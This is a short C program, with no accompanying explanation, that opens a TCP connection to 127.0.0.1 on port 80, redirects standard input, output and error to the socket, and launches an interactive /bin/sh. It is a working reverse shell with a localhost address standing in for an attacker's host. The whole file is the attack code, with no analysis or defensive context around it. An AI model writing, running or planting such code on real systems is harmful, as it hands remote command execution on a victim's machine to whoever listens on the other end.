#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main (int argc, char **argv)
{
 int sock;
 struct sockaddr_in client;

 client.sin_family = AF_INET;
 client.sin_addr.s_addr = inet_addr("127.0.0.1");
 client.sin_port = htons(80);

 sock = socket(AF_INET, SOCK_STREAM,0);
 connect(sock,(struct sockaddr *)&client,sizeof(client));

 dup2(sock,0); // STDIN
 dup2(sock,1); // STDOUT
 dup2(sock,2); // STDERR

 execl("/bin/sh","sh","-i",NULL,NULL);

 return 0;

} 
